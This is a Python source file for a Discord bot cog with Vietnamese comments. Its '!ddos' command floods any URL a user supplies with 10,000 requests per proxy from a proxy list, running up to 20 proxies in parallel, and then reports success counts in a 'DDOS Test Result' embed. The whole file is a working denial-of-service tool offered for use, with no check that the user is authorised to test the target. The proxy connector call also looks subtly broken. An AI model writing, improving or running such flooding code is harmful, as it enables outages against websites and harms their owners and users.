import discord
from discord.ext import commands
import aiohttp
import asyncio
import re
import time

class DDOS(commands.Cog):
    def __init__(self, bot):
        self.bot = bot

    @commands.command(name="ddos")
    async def ddos(self, ctx, url: str):
        """
        !ddos [url]
        Gửi 10.000 request mỗi proxy, nếu proxy lỗi >10 lần thì bỏ qua proxy đó.
        """
        await ctx.send("🚀 Đang bắt đầu gửi request, vui lòng chờ...")

        # Đọc proxy từ file
        proxies = []
        with open("proxies.txt", "r", encoding="utf-8") as f:
            for line in f:
                line = line.strip()
                if re.match(r"^(http://|socks4://)?\d{1,3}(\.\d{1,3}){3}:\d+", line):
                    proxies.append(line)

        total_proxy = len(proxies)
        requests_per_proxy = 10000
        total_requests = total_proxy * requests_per_proxy
        success = 0
        failed = 0
        proxy_skipped = 0

        start_time = time.time()

        async def send_requests(proxy):
            nonlocal success, failed, proxy_skipped
            error_count = 0
            for _ in range(requests_per_proxy):
                try:
                    if proxy.startswith("socks4://"):
                        conn = aiohttp.ProxyConnector.from_url(proxy)
                    elif proxy.startswith("http://"):
                        conn = aiohttp.ProxyConnector.from_url(proxy)
                    else:
                        conn = aiohttp.ProxyConnector.from_url(f"http://{proxy}")
                    timeout = aiohttp.ClientTimeout(total=8)
                    async with aiohttp.ClientSession(connector=conn, timeout=timeout) as session:
                        async with session.get(url) as resp:
                            if resp.status == 200:
                                success += 1
                            else:
                                failed += 1
                except Exception:
                    failed += 1
                    error_count += 1
                    if error_count > 10:
                        proxy_skipped += 1
                        break

        # Chạy song song, tối đa 20 proxy cùng lúc
        tasks = []
        sem = asyncio.Semaphore(20)
        async def sem_task(proxy):
            async with sem:
                await send_requests(proxy)

        for proxy in proxies:
            tasks.append(sem_task(proxy))
        await asyncio.gather(*tasks)

        end_time = time.time()
        duration = end_time - start_time

        # Tạo embed kết quả
        embed = discord.Embed(
            title="💥 DDOS Test Result",
            color=discord.Color.red()
        )
        embed.add_field(name="🌐 URL", value=url, inline=False)
        embed.add_field(name="🔢 Proxy sử dụng", value=str(total_proxy), inline=True)
        embed.add_field(name="🔁 Request mỗi proxy", value=str(requests_per_proxy), inline=True)
        embed.add_field(name="📊 Tổng request dự kiến", value=str(total_requests), inline=True)
        embed.add_field(name="✅ Thành công", value=f"{success} request", inline=True)
        embed.add_field(name="❌ Thất bại", value=f"{failed} request", inline=True)
        embed.add_field(name="🚫 Proxy bị loại", value=f"{proxy_skipped} proxy", inline=True)
        embed.add_field(name="⏱️ Thời gian", value=f"{duration:.2f} giây", inline=True)
        embed.set_footer(text="DDOS Test | by your bot")
        await ctx.send(embed=embed)

async def setup(bot):
    await bot.add_cog(DDOS(bot))
